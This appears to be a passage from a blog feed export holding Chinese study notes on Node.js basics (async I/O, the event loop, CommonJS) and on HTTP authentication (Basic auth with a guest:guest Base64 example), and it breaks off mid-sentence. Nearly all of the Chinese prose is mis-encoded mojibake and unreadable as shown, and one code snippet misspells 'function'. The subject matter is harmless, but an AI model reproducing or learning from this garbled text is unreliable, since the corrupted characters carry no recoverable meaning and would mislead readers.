    <content type="text"><![CDATA[å¿ƒå¿ƒå¿µå¿µè¦å­¦ä¹ çš„nodejsä»Žä»Šå¤©å¼€å§‹ï¼Œè¯» ã€Šnode.jså¼€å‘æŒ‡å—ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ Node.jsï¼Œæˆ–è€… Nodeï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥è®© JavaScript è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯çš„å¹³å°ã€‚å®ƒå¯ä»¥è®©JavaScript è„±ç¦»æµè§ˆå™¨çš„æŸç¼šè¿è¡Œåœ¨ä¸€èˆ¬çš„æœåŠ¡å™¨çŽ¯å¢ƒä¸‹ï¼Œå°±åƒè¿è¡Œ Pythonã€Perlã€PHPã€Rubyç¨‹åºä¸€æ ·ã€‚ä½ å¯ä»¥ç”¨ Node.js è½»æ¾åœ°è¿›è¡ŒæœåŠ¡å™¨ç«¯åº”ç”¨å¼€å‘ï¼ŒPythonã€Perlã€PHPã€Ruby èƒ½åšçš„äº‹æƒ… Node.js å‡ ä¹Žéƒ½èƒ½åšï¼Œè€Œä¸”å¯ä»¥åšå¾—æ›´å¥½ã€‚ Node.js æ˜¯ä¸€ä¸ªä¸º å®žæ—¶ Webï¼ˆReal-time Webï¼‰åº”ç”¨å¼€å‘è€Œè¯žç”Ÿçš„å¹³å°ï¼Œå®ƒä»Žè¯žç”Ÿä¹‹åˆå°±å……åˆ†è€ƒè™‘äº†åœ¨å®žæ—¶å“åº”ã€è¶…å¤§è§„æ¨¡æ•°æ®è¦æ±‚ä¸‹æž¶æž„çš„å¯æ‰©å±•æ€§ã€‚è¿™ä½¿å¾—å®ƒæ‘’å¼ƒäº†ä¼ ç»Ÿå¹³å°ä¾é å¤šçº¿ç¨‹æ¥å®žçŽ°é«˜å¹¶å‘çš„è®¾è®¡æ€è·¯ï¼Œè€Œé‡‡ç”¨äº†å•çº¿ç¨‹ã€å¼‚æ­¥å¼I/Oã€äº‹ä»¶é©±åŠ¨å¼çš„ç¨‹åºè®¾è®¡æ¨¡åž‹ã€‚è¿™äº›ç‰¹æ€§ä¸ä»…å¸¦æ¥äº†å·¨å¤§çš„æ€§èƒ½æå‡ï¼Œè¿˜å‡å°‘äº†å¤šçº¿ç¨‹ç¨‹åºè®¾è®¡çš„å¤æ‚æ€§ï¼Œè¿›è€Œæé«˜äº†å¼€å‘æ•ˆçŽ‡ã€‚ å°½ç®¡å®ƒè¯žç”Ÿçš„æ—¶é—´ï¼ˆ2009å¹´ï¼‰è¿˜ä¸é•¿ï¼Œä½†å®ƒçš„å‘¨å›´å·²ç»å½¢æˆäº†ä¸€ä¸ªåºžå¤§çš„ç”Ÿæ€ç³»ç»Ÿã€‚Node.js æœ‰ç€å¼ºå¤§è€Œçµæ´»çš„ åŒ…ç®¡ç†å™¨ ï¼ˆnode package managerï¼Œnpmï¼‰ï¼Œç›®å‰å·²ç»æœ‰ä¸Šä¸‡ä¸ªç¬¬ä¸‰æ–¹æ¨¡å—ï¼Œå…¶ä¸­æœ‰ç½‘ç«™å¼€å‘æ¡†æž¶ï¼Œæœ‰ MySQLã€PostgreSQLã€MongoDB æ•°æ®åº“æŽ¥å£ï¼Œæœ‰æ¨¡æ¿è¯­è¨€è§£æžã€CSS ç”Ÿæˆå·¥å…·ã€é‚®ä»¶ã€åŠ å¯†ã€å›¾å½¢ã€è°ƒè¯•æ”¯æŒï¼Œç”šè‡³è¿˜æœ‰å›¾å½¢ç”¨æˆ·ç•Œé¢å’Œæ“ä½œç³»ç»Ÿ APIå·¥å…·ã€‚ Node.jsç®€ä»‹Node.js æ˜¯ä»€ä¹ˆNode.js ä¸æ˜¯ä¸€é—¨ç‹¬ç«‹çš„è¯­è¨€ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ª JavaScript æ¡†æž¶ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ªæµè§ˆå™¨ç«¯çš„åº“ã€‚Node.js æ˜¯ä¸€ä¸ªè®© JavaScript è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯çš„å¼€å‘å¹³å°ï¼Œå®ƒè®© JavaScript æˆä¸ºè„šæœ¬è¯­è¨€çš„ä¸€ç­‰å…¬æ°‘ï¼Œåœ¨æœåŠ¡ç«¯å ªä¸Ž PHPã€Pythonã€Perlã€Ruby å¹³èµ·å¹³åã€‚ Node.js æ˜¯ä¸€ä¸ªåˆ’æ—¶ä»£çš„æŠ€æœ¯ï¼Œå®ƒåœ¨åŽŸæœ‰çš„ Web å‰ç«¯å’ŒåŽç«¯æŠ€æœ¯çš„åŸºç¡€ä¸Šæ€»ç»“å¹¶æç‚¼å‡ºäº†è®¸å¤šæ–°çš„æ¦‚å¿µå’Œæ–¹æ³•ï¼Œå ªç§°æ˜¯åå¤šå¹´æ¥ Web å¼€å‘ç»éªŒçš„é›†å¤§æˆè€…ã€‚Node.js å¯ä»¥ä½œä¸ºæœåŠ¡å™¨å‘ç”¨æˆ·æä¾›æœåŠ¡ï¼Œä¸Ž PHPã€Pythonã€Ruby on Rails ç›¸æ¯”ï¼Œå®ƒè·³è¿‡äº† Apacheã€Nginx ç­‰ HTTPæœåŠ¡å™¨ï¼Œç›´æŽ¥é¢å‘å‰ç«¯å¼€å‘ã€‚Node.js çš„è®¸å¤šè®¾è®¡ç†å¿µä¸Žç»å…¸æž¶æž„ï¼ˆå¦‚ LAMPï¼‰æœ‰ç€å¾ˆå¤§çš„ä¸åŒï¼Œå¯æä¾›å¼ºå¤§çš„ä¼¸ç¼©èƒ½åŠ›ï¼Œä»¥é€‚åº”21ä¸–çºª10å¹´ä»£ä»¥åŽè§„æ¨¡è¶Šæ¥è¶Šåºžå¤§çš„äº’è”ç½‘çŽ¯å¢ƒã€‚ Node.js ä¸Ž JavaScriptä¼ ç»Ÿæ„ä¹‰ä¸Šï¼ŒJavaScript æ˜¯ç”± ECMAScriptã€æ–‡æ¡£å¯¹è±¡æ¨¡åž‹ï¼ˆDOMï¼‰å’Œæµè§ˆå™¨å¯¹è±¡æ¨¡åž‹ï¼ˆBOMï¼‰ç»„æˆçš„ï¼Œè€Œ Mozilla åˆ™æŒ‡å‡º JavaScript ç”±Core JavaScript å’Œ Client JavaScript ç»„æˆã€‚ Node.js ä¸­æ‰€è°“çš„ JavaScript åªæ˜¯ Core JavaScriptï¼Œæˆ–è€…è¯´æ˜¯ ECMAScript çš„ä¸€ä¸ªå®žçŽ°ï¼Œä¸åŒ…å« DOMã€BOM æˆ–è€… Client JavaScriptã€‚è¿™æ˜¯å› ä¸º Node.js ä¸è¿è¡Œåœ¨æµè§ˆå™¨ä¸­ï¼Œæ‰€ä»¥ä¸éœ€è¦ä½¿ç”¨æµè§ˆå™¨ä¸­çš„è®¸å¤šç‰¹æ€§ã€‚ Node.js æ˜¯ä¸€ä¸ªè®© JavaScript è¿è¡Œåœ¨æµè§ˆå™¨ä¹‹å¤–çš„å¹³å°ã€‚å®ƒå®žçŽ°äº†è¯¸å¦‚æ–‡ä»¶ç³»ç»Ÿã€æ¨¡å—ã€åŒ…ã€æ“ä½œç³»ç»Ÿ APIã€ç½‘ç»œé€šä¿¡ç­‰ Core JavaScript æ²¡æœ‰æˆ–è€…ä¸å®Œå–„çš„åŠŸèƒ½ã€‚ éšç€ Node.js çš„æˆåŠŸï¼Œå„ç§æµè§ˆå™¨å¤–çš„ JavaScript å®žçŽ°é€æ­¥å…´èµ·ï¼Œå› æ­¤äº§ç”Ÿäº† CommonJS è§„èŒƒã€‚CommonJS è¯•å›¾æ‹Ÿå®šä¸€å¥—å®Œæ•´çš„ JavaScript è§„èŒƒï¼Œä»¥å¼¥è¡¥æ™®é€šåº”ç”¨ç¨‹åºæ‰€éœ€çš„ APIï¼Œè­¬å¦‚æ–‡ä»¶ç³»ç»Ÿè®¿é—®ã€å‘½ä»¤è¡Œã€æ¨¡å—ç®¡ç†ã€å‡½æ•°åº“é›†æˆç­‰åŠŸèƒ½ã€‚CommonJS åˆ¶å®šè€…å¸Œæœ›ä¼—å¤šæœåŠ¡ç«¯ JavaScript å®žçŽ°éµå¾ªCommonJS è§„èŒƒï¼Œä»¥ä¾¿ç›¸äº’å…¼å®¹å’Œä»£ç å¤ç”¨ã€‚Node.js çš„éƒ¨ä»½å®žçŽ°éµå¾ªäº†CommonJSè§„èŒƒï¼Œä½†ç”±äºŽä¸¤è€…è¿˜éƒ½å¤„äºŽè¯žç”Ÿä¹‹åˆçš„å¿«é€Ÿå˜åŒ–æœŸï¼Œä¹Ÿä¼šæœ‰ä¸ä¸€è‡´çš„åœ°æ–¹ã€‚ Node.js çš„ JavaScript å¼•æ“Žæ˜¯ å·ç§°æ˜¯ç›®å‰ä¸–ç•Œä¸Šæœ€å¿«â€”â€”çš„ JavaScript å¼•æ“ŽV8ã€‚ Node.js èƒ½åšä»€ä¹ˆä½¿ç”¨ Node.js å¯ä»¥å¼€å‘ï¼š å…·æœ‰å¤æ‚é€»è¾‘çš„ç½‘ç«™ åŸºäºŽç¤¾äº¤ç½‘ç»œçš„å¤§è§„æ¨¡ Web åº”ç”¨ Web Socket æœåŠ¡å™¨ TCP/UDP å¥—æŽ¥å­—åº”ç”¨ç¨‹åº å‘½ä»¤è¡Œå·¥å…· äº¤äº’å¼ç»ˆç«¯ç¨‹åº å¸¦æœ‰å›¾å½¢ç”¨æˆ·ç•Œé¢çš„æœ¬åœ°åº”ç”¨ç¨‹åº å•å…ƒæµ‹è¯•å·¥å…· å®¢æˆ·ç«¯ JavaScript ç¼–è¯‘å™¨ Node.js å†…å»ºäº† HTTP æœåŠ¡å™¨æ”¯æŒï¼Œä¹Ÿå°±æ˜¯è¯´ä½ å¯ä»¥è½»è€Œæ˜“ä¸¾åœ°å®žçŽ°ä¸€ä¸ªç½‘ç«™å’ŒæœåŠ¡å™¨çš„ç»„åˆã€‚Node.js è¿˜å¯ä»¥éƒ¨ç½²åˆ°éžç½‘ç»œåº”ç”¨çš„çŽ¯å¢ƒä¸‹ï¼Œæ¯”å¦‚ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ã€‚Node.js è¿˜å¯ä»¥è°ƒç”¨C/C++ çš„ä»£ç ï¼Œè¿™æ ·å¯ä»¥å……åˆ†åˆ©ç”¨å·²æœ‰çš„è¯¸å¤šå‡½æ•°åº“ï¼Œä¹Ÿå¯ä»¥å°†å¯¹æ€§èƒ½è¦æ±‚éžå¸¸é«˜çš„éƒ¨åˆ†ç”¨C/C++ æ¥å®žçŽ°ã€‚ å¼‚æ­¥å¼ I/O ä¸Žäº‹ä»¶é©±åŠ¨Node.js æœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯é‡‡ç”¨å¼‚æ­¥å¼ I/O ä¸Žäº‹ä»¶é©±åŠ¨çš„æž¶æž„è®¾è®¡ã€‚å¯¹äºŽé«˜å¹¶å‘çš„è§£å†³æ–¹æ¡ˆï¼Œä¼ ç»Ÿçš„æž¶æž„æ˜¯å¤šçº¿ç¨‹æ¨¡åž‹ï¼Œä¹Ÿå°±æ˜¯ä¸ºæ¯ä¸ªä¸šåŠ¡é€»è¾‘æä¾›ä¸€ä¸ªç³»ç»Ÿçº¿ç¨‹ï¼Œé€šè¿‡ç³»ç»Ÿçº¿ç¨‹åˆ‡æ¢æ¥å¼¥è¡¥åŒæ­¥å¼ I/O è°ƒç”¨æ—¶çš„æ—¶é—´å¼€é”€ã€‚Node.js ä½¿ç”¨çš„æ˜¯å•çº¿ç¨‹æ¨¡åž‹ï¼Œå¯¹äºŽæ‰€æœ‰ I/O éƒ½é‡‡ç”¨å¼‚æ­¥è¯·æ±‚æ–¹å¼ï¼Œé¿å…äº†é¢‘ç¹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚Node.js åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ä¼šç»´æŠ¤ä¸€ä¸ªæ—¶é—´é˜Ÿåˆ—ï¼Œç¨‹åº åœ¨æ‰§è¡Œæ—¶è¿›å…¥æ—¶é—´å¾ªçŽ¯ç­‰å¾…ä¸‹ä¸€ä¸ªäº‹ä»¶åˆ°æ¥ï¼Œæ¯ä¸ªå¼‚æ­¥å¼è¯·æ±‚å®ŒæˆåŽä¼šè¢«æŽ¨é€åˆ°äº‹ä»¶é˜Ÿåˆ—ï¼Œç­‰å¾…ç¨‹åºè¿›ç¨‹è¿›è¡Œå¤„ç†ã€‚ ä¾‹å¦‚å¯¹äºŽç®€å•è€Œå¸¸è§çš„æ•°æ®åº“æŸ¥è¯¢æ“ä½œï¼ŒæŒ‰ç…§ä¼ ç»Ÿæ–¹å¼å®žçŽ°çš„ä»£ç å¦‚ä¸‹ï¼š 12res = db.query('SELECT * from some_table')res.output(); ä»¥ä¸Šä»£ç åœ¨æ‰§è¡Œåˆ°ç¬¬ä¸€è¡Œçš„æ—¶å€™ï¼Œçº¿ç¨‹ä¼šå µå¡žï¼Œç­‰å¾…æ•°æ®åº“è¿”å›žæŸ¥è¯¢ç»“æžœï¼Œç„¶åŽå†ç»§ç»­å¤„ç†ã€‚ç„¶è€Œï¼Œç”±äºŽæ•°æ®åº“æŸ¥è¯¢å¯èƒ½æ¶‰åŠç£ç›˜è¯»å†™å’Œç½‘ç»œé€šä¿¡ï¼Œå…¶å»¶æ—¶å¯èƒ½ç›¸å½“å¤§ï¼ˆé•¿è¾¾å‡ ä¸ªåˆ°å‡ ç™¾æ¯«ç§’ï¼Œç›¸æ¯”CPUçš„æ—¶é’Ÿå·®äº†å¥½å‡ ä¸ªæ•°é‡çº§ï¼‰ï¼Œçº¿ç¨‹ä¼šåœ¨è¿™é‡Œé˜»å¡žç­‰å¾…ç»“æžœè¿”å›žï¼Œå¯¹äºŽé«˜å¹¶å‘çš„è®¿é—®ï¼Œä¸€æ–¹é¢çº¿ç¨‹é•¿æœŸé˜»å¡žç­‰å¾…ï¼Œå¦ä¸€æ–¹é¢ä¸ºäº†åº”ä»˜æ–°è¯·æ±‚è€Œä¸æ–­æ–°å¢žåŠ çº¿ç¨‹ï¼Œå› æ­¤ä¼šæµªè´¹å¤§é‡ç³»ç»Ÿèµ„æºï¼ŒåŒæ—¶çº¿ç¨‹çš„å¢žå¤šä¹Ÿä¼šå ç”¨å¤§é‡çš„ CPU æ—¶é—´æ¥å¤„ç†å†…å­˜ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œè€Œä¸”è¿˜å®¹æ˜“é­å—ä½Žé€Ÿè¿žæŽ¥æ”»å‡»ã€‚ çœ‹çœ‹ Nodejs æ˜¯å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜çš„ã€‚ 123db.query('SELECT * from some_table',fucntion(res)&#123; res.output(); &#125;) è¿™æ®µä»£ç ä¸­ï¼Œdb.query çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå›žè°ƒå‡½æ•°ã€‚è¿›ç¨‹åœ¨æ‰§è¡Œåˆ° db.query çš„æ—¶å€™ï¼Œä¸ä¼šæœ‰ç»“æžœè¿”å›žï¼Œè€Œæ˜¯ç›´æŽ¥ç»§ç»­æ‰§è¡ŒåŽé¢çš„è¯­å¥ï¼ŒçŸ¥é“è¿›å…¥æ—¶é—´å¾ªçŽ¯ã€‚å½“æ•°æ®åº“æŸ¥è¯¢ç»“æžœè¿”å›žæ—¶ï¼Œä¼šå°†äº‹ä»¶å‘é€åˆ°äº‹ä»¶é˜Ÿåˆ—ï¼Œç­‰åˆ°çº¿ç¨‹è¿›å…¥äº‹ä»¶å¾ªçŽ¯ä»¥åŽï¼Œæ‰ä¼šè°ƒç”¨ä¹‹å‰çš„å›žè°ƒå‡½æ•°ç»§ç»­æ‰§è¡ŒåŽé¢çš„é€»è¾‘ã€‚ Node.js çš„å¼‚æ­¥æœºåˆ¶æ˜¯åŸºäºŽæ—¶é—´ï¼Œæ‰€æœ‰çš„ç£ç›˜I/Oã€ç½‘ç»œé€šä¿¡ã€æ•°æ®åº“æŸ¥è¯¢éƒ½ä»¥éžé˜»å¡žçš„æ–¹å¼è¯·æ±‚ï¼Œè¿”å›žçš„ç»“æžœç”±äº‹ä»¶å¾ªçŽ¯æ¥å¤„ç†ã€‚ è¿™æ ·çš„å¥½å¤„æ˜¯ï¼ŒCPU å’Œå†…å­˜åœ¨åŒä¸€æ—¶é—´é›†ä¸­å¤„ç†ä¸€ä»¶äº‹ï¼ŒåŒæ—¶å°½å¯èƒ½è®©è€—æ—¶çš„I/O æ“ä½œå¹¶è¡Œæ‰§è¡Œã€‚å¯¹äºŽä½Žé€Ÿè¿žæŽ¥æ”»å‡»ï¼ŒNode.js åªæ˜¯åœ¨äº‹ä»¶é˜Ÿåˆ—ä¸­å¢žåŠ è¯·æ±‚ï¼Œç­‰å¾…æ“ä½œç³»ç»Ÿçš„å›žåº”ï¼Œå› æ­¤ä¸ä¼šæœ‰ä»»ä½•å¤šçº¿ç¨‹å¼€é”€ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå¯ä»¥æå‡ Web åº”ç”¨çš„å¥å£®æ€§ï¼Œé˜²æ­¢æ¶æ„æ”»å‡»ã€‚ è¿™ç§å¼‚æ­¥äº‹ä»¶æ¨¡å¼çš„å¼Šç«¯ä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå› ä¸ºå®ƒä¸ç¬¦åˆå¼€å‘è€…çš„å¸¸è§„çº¿æ€§æ€è·¯ï¼Œå¾€å¾€éœ€è¦æŠŠä¸€ä¸ªå®Œæ•´çš„é€»è¾‘æ‹†åˆ†æˆä¸€ä¸ªä¸ªäº‹ä»¶ï¼Œå¢žåŠ äº†å¼€å‘å’Œè°ƒè¯•çš„éš¾åº¦ã€‚é’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼ŒNode.jsç¬¬ä¸‰æ–¹æ¨¡å—æå‡ºäº†å¾ˆå¤šè§£å†³æ–¹æ¡ˆï¼Œä¼šåœ¨åŽé¢ç¬¬å…­éƒ¨åˆ†è¯¦ç»†è®¨è®ºã€‚ Node.js çš„æ€§èƒ½Node.js é™¤äº†ä½¿ç”¨ V8 ä½œä¸ºJavaScriptå¼•æ“Žä»¥å¤–ï¼Œè¿˜ä½¿ç”¨äº†é«˜æ•ˆçš„ libev å’Œ libeio åº“æ”¯æŒäº‹ä»¶é©±åŠ¨å’Œå¼‚æ­¥å¼ I/Oã€‚ CommonJSæ­£å¦‚å½“å¹´ä¸ºäº†ç»Ÿä¸€ JavaScript è¯­è¨€æ ‡å‡†ï¼Œäººä»¬åˆ¶å®šäº† ECMAScript è§„èŒƒä¸€æ ·ï¼Œå¦‚ä»Šä¸ºäº†ç»Ÿä¸€ JavaScript åœ¨æµè§ˆå™¨ä¹‹å¤–çš„å®žçŽ°ï¼ŒCommonJS è¯žç”Ÿäº†ã€‚CommonJS è¯•å›¾å®šä¹‰ä¸€å¥—æ™®é€šåº”ç”¨ç¨‹åºä½¿ç”¨çš„ APIï¼Œä»Žè€Œå¡«è¡¥ JavaScript æ ‡å‡†åº“è¿‡äºŽç®€å•çš„ä¸è¶³ã€‚CommonJS çš„æœ€ç»ˆç›®æ ‡æ˜¯åˆ¶å®šä¸€ä¸ªåƒ C++ æ ‡å‡†åº“ä¸€æ ·çš„è§„èŒƒï¼Œä½¿å¾—åŸºäºŽ CommonJS API çš„åº”ç”¨ç¨‹åºå¯ä»¥åœ¨ä¸åŒçš„çŽ¯å¢ƒä¸‹è¿è¡Œï¼Œå°±åƒç”¨ C++ ç¼–å†™çš„åº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨ä¸åŒçš„ç¼–è¯‘å™¨å’Œè¿è¡Œæ—¶å‡½æ•°åº“ä¸€æ ·ã€‚ä¸ºäº†ä¿æŒä¸­ç«‹ï¼ŒCommonJS ä¸å‚ä¸Žæ ‡å‡†åº“å®žçŽ°ï¼Œå…¶å®žçŽ°äº¤ç»™åƒ Node.js ä¹‹ç±»çš„é¡¹ç›®æ¥å®Œæˆã€‚ CommonJS è§„èŒƒåŒ…æ‹¬äº†æ¨¡å—ï¼ˆmodulesï¼‰ã€åŒ…ï¼ˆpackagesï¼‰ã€ç³»ç»Ÿï¼ˆsystemï¼‰ã€äºŒè¿›åˆ¶ï¼ˆbinaryï¼‰ã€æŽ§åˆ¶å°ï¼ˆconsoleï¼‰ã€ç¼–ç ï¼ˆencodingsï¼‰ã€æ–‡ä»¶ç³»ç»Ÿï¼ˆfilesystemsï¼‰ã€å¥—æŽ¥å­—ï¼ˆsocketsï¼‰ã€å•å…ƒæµ‹è¯•ï¼ˆunit testingï¼‰ç­‰éƒ¨åˆ†]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ·±å…¥æµ…å‡ºHTTPï¼Œä»Žå¼€å§‹åˆ°æ”¾å¼ƒï¼ˆç¬¬å…«ç« ï¼‰â€”â€” ç¡®è®¤è®¿é—®ç”¨æˆ·èº«ä»½çš„è®¤è¯]]></title>
    <url>%2F2018-09-12-read-%E5%9B%BE%E8%A7%A3HTTP-Part8.html</url>
    <content type="text"><![CDATA[ç”±äºŽæœ‰äº›äº‹æƒ…æ‰€ä»¥è¡¥ä¼‘ï¼Œè¿™æ®µæ—¶é—´å°±æ²¡æœ‰æ€Žä¹ˆçœ‹è¿™æœ¬ä¹¦ï¼Œä»Šå¤©è¶ç€åŽå°æŽ¥å£æœ‰é—®é¢˜ï¼ŒåŽå°åˆè¿˜æ²¡æœ‰æ¥ï¼Œå¿™é‡Œå·é—²ï¼Œè¯»å¤šä¸€ç« ã€‚ æŸäº› Web é¡µé¢åªæƒ³è®©ç‰¹å®šçš„äººæµè§ˆï¼Œæˆ–è€…å¹²è„†ä»…æœ¬äººå¯è§ã€‚ä¸ºè¾¾åˆ°è¿™ä¸ªç›®æ ‡ï¼Œå¿…ä¸å¯å°‘çš„å°±æ˜¯è®¤è¯åŠŸèƒ½ ç¬¬å…«ç«  ç¡®è®¤è®¿é—®ç”¨æˆ·èº«ä»½çš„è®¤è¯ä½•ä¸ºè®¤è¯è®¡ç®—æœºæœ¬èº«æ— æ³•åˆ¤æ–­ååœ¨æ˜¾ç¤ºå™¨å‰çš„ä½¿ç”¨è€…çš„èº«ä»½ã€‚æ‰€ä»¥ä¸€èˆ¬éœ€è¦æ ¸å¯¹ â€œç™»å½•è€…æœ¬äººæ‰çŸ¥é“çš„ä¿¡æ¯â€ã€â€œç™»å½•è€…æœ¬äººæ‰ä¼šæœ‰çš„ä¿¡æ¯â€ã€‚ æ ¸å¯¹çš„ä¿¡æ¯é€šå¸¸æ˜¯æŒ‡ä¸€ä¸‹è¿™äº›ã€‚ å¯†ç ï¼šåªæœ‰æœ¬äººæ‰ä¼šçŸ¥é“çš„å­—ç¬¦ä¸²ä¿¡æ¯ã€‚ åŠ¨æ€ä»¤ç‰Œï¼šä»…é™æœ¬äººæŒæœ‰çš„è®¾å¤‡å†…æ˜¾ç¤ºçš„ä¸€æ¬¡æ€§å¯†ç ã€‚ æ•°å­—è¯ä¹¦ï¼šä»…é™æœ¬äººï¼ˆç»ˆç«¯ï¼‰æŒæœ‰çš„ä¿¡æ¯ã€‚ ç”Ÿç‰©è®¤è¯ï¼šæŒ‡çº¹å’Œè™¹è†œç­‰æœ¬äººçš„ç”Ÿç†ä¿¡æ¯ã€‚ IC å¡ç­‰ï¼šä»…é™æœ¬äººæŒæœ‰çš„ä¿¡æ¯ã€‚ ä½†æ˜¯ï¼Œå³ä¾¿å¯¹æ–¹æ˜¯å‡å†’çš„ï¼Œåªè¦èƒ½é€šè¿‡ç”¨æˆ·è®¤è¯ï¼Œé‚£ä¹ˆè®¡ç®—æœºå°±ä¼šé»˜è®¤å‡ºè‡ªæœ¬äººçš„è¡Œä¸ºã€‚å› æ­¤ï¼ŒæŽŒæ¡æœºå¯†ä¿¡æ¯çš„å¯†ç ç»ä¸èƒ½è®©ä»–äººå¾—åˆ°ï¼Œæ›´ä¸èƒ½è½»æ˜“å°±è¢«ç ´è§£å‡ºæ¥ã€‚ HTTP ä½¿ç”¨çš„è®¤è¯æ–¹å¼ HTTP/1.1 ä½¿ç”¨çš„è®¤è¯æ–¹å¼å¦‚ä¸‹æ‰€ç¤ºã€‚ BASIC è®¤è¯ï¼ˆåŸºæœ¬è®¤è¯ï¼‰ DIGEST è®¤è¯ï¼ˆæ‘˜è¦è®¤è¯ï¼‰ SSL å®¢æˆ·ç«¯è®¤è¯ FormBase è®¤è¯ï¼ˆåŸºäºŽè¡¨å•è®¤è¯ï¼‰ æ­¤å¤–ï¼Œè¿˜æœ‰ Windows ç»Ÿä¸€è®¤è¯ï¼ˆKeberos è®¤è¯ã€NTLM è®¤è¯ï¼‰ BASIC è®¤è¯BASIC è®¤è¯æ˜¯ä»Ž HTTP/1.0 å°±å®šä¹‰çš„è®¤è¯æ–¹å¼ã€‚å³ä¾¿æ˜¯çŽ°åœ¨ä»æœ‰ä¸€éƒ¨åˆ†ç½‘ç«™ä¼šä½¿ç”¨è¿™ç§è®¤è¯æ–¹å¼ï¼Œæ˜¯ Web æœåŠ¡å™¨ä¸Žé€šä¿¡å®¢æˆ·ç«¯ä¹‹é—´è¿›è¡Œçš„è®¤è¯æ–¹å¼ã€‚ BASIC è®¤è¯çš„è®¤è¯æ­¥éª¤ æ­¥éª¤1ï¼š å½“è¯·æ±‚çš„èµ„æºéœ€è¦ BASIC è®¤è¯æ—¶ï¼ŒæœåŠ¡å™¨ä¼šéšçŠ¶æ€ç 401 Authorization Required ï¼Œè¿”å›žå¸¦ WWW-Authenticate é¦–éƒ¨å­—æ®µçš„å“åº”ã€‚è¯¥å­—æ®µå†…åŒ…å«è®¤è¯çš„æ–¹å¼ï¼ˆBASICï¼‰åŠ Request-URI å®‰å…¨åŸŸå­—ç¬¦ä¸²ï¼ˆrealmï¼‰ æ­¥éª¤2ï¼š æŽ¥å—åˆ°çŠ¶æ€ç  401 çš„å®¢æˆ·ç«¯ä¸ºäº†é€šè¿‡ BASIC è®¤è¯ï¼Œéœ€è¦å°†ç”¨æˆ· ID åŠå¯†ç å‘é€ç»™æœåŠ¡å™¨ã€‚å‘é€çš„å­—ç¬¦ä¸²å†…å®¹æ˜¯ç”±ç”¨æˆ· ID å’Œå¯†ç æž„æˆï¼Œä¸¤è€…ä¹‹é—´ç”¨å†’å·ï¼ˆï¼šï¼‰è¿žæŽ¥åŽï¼Œå†ç»è¿‡ Base64 ç¼–ç å¤„ç†ã€‚ å‡è®¾ç”¨æˆ· ID ä¸º guest ï¼Œå¯†ç ä¹Ÿæ˜¯ï¼Œè¿žæŽ¥èµ·æ¥å°±æ˜¯ guest: guest è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚ç„¶åŽç»è¿‡ Base64 ç¼–ç ï¼Œæœ€åŽçš„ç»“æžœå³æ˜¯ Z3Vlc3Q6Z3Vlc3Q=ã€‚æŠŠè¿™ä¸²å­—ç¬¦ä¸²å†™å…¥é¦–éƒ¨å­—æ®µ Authorization åŽï¼Œå‘é€è¯·æ±‚ã€‚ å½“ç”¨æˆ·ä»£ç†ä¸ºæµè§ˆå™¨æ—¶ï¼Œç”¨æˆ·ä»…éœ€è¾“å…¥ç”¨æˆ· ID å’Œå¯†ç å³å¯ï¼Œä¹‹åŽï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®Œæˆåˆ° Base64 ç¼–ç çš„è½¬æ¢å·¥ä½œã€‚ æ­¥éª¤3ï¼šæŽ¥æ”¶åˆ°åŒ…å«é¦–éƒ¨å­—æ®µ Authorization è¯·æ±‚çš„æœåŠ¡å™¨ï¼Œä¼šå¯¹è®¤è¯ä¿¡æ¯çš„æ­£ç¡®æ€§è¿›è¡ŒéªŒè¯ã€‚å¦‚éªŒè¯é€šè¿‡ï¼Œåˆ™è¿”å›žä¸€æ¡åŒ…å« Request-URI èµ„æºçš„å“åº”ã€‚BASIC è®¤è¯è™½ç„¶é‡‡ç”¨ Base64 ç¼–ç æ–¹å¼ï¼Œä½†è¿™ä¸æ˜¯åŠ å¯†å¤„ç†ã€‚ä¸éœ€è¦ä»»ä½•é™„åŠ ä¿¡æ¯å³å¯å¯¹å…¶è§£ç ã€‚æ¢è¨€ä¹‹ï¼Œç”±äºŽæ˜Žæ–‡è§£ç åŽå°±æ˜¯ç”¨æˆ· IDå’Œå¯†ç ï¼Œåœ¨ HTTP ç­‰éžåŠ å¯†é€šä¿¡çš„çº¿è·¯ä¸Šè¿›è¡Œ BASIC è®¤è¯çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æžœè¢«äººçªƒå¬ï¼Œè¢«ç›—çš„å¯èƒ½æ€§æžé«˜ã€‚ å¦å¤–ï¼Œé™¤æ­¤ä¹‹å¤–æƒ³å†è¿›è¡Œä¸€æ¬¡ BASIC è®¤è¯æ—¶ï¼Œä¸€èˆ¬çš„æµè§ˆå™¨å´æ— æ³•å®žçŽ°è®¤è¯æ³¨é”€æ“ä½œï¼Œè¿™ä¹Ÿæ˜¯é—®é¢˜ä¹‹ä¸€ã€‚BASIC è®¤è¯ä½¿ç”¨ä¸Šä¸å¤Ÿä¾¿æ·çµæ´»ï¼Œä¸”è¾¾ä¸åˆ°å¤šæ•° Web ç½‘ç«™æœŸæœ›çš„å®‰å…¨æ€§ç­‰çº§ï¼Œå› æ­¤å®ƒå¹¶ä¸å¸¸ç”¨ã€‚ DIGEST è®¤è¯ä¸ºäº†å¼¥è¡¥ BASIC è®¤è¯å­˜åœ¨çš„å¼±ç‚¹ï¼Œä»Ž HTTP/1.1 èµ·å°±æœ‰äº† DIGEST è®¤è¯ã€‚DIGEST 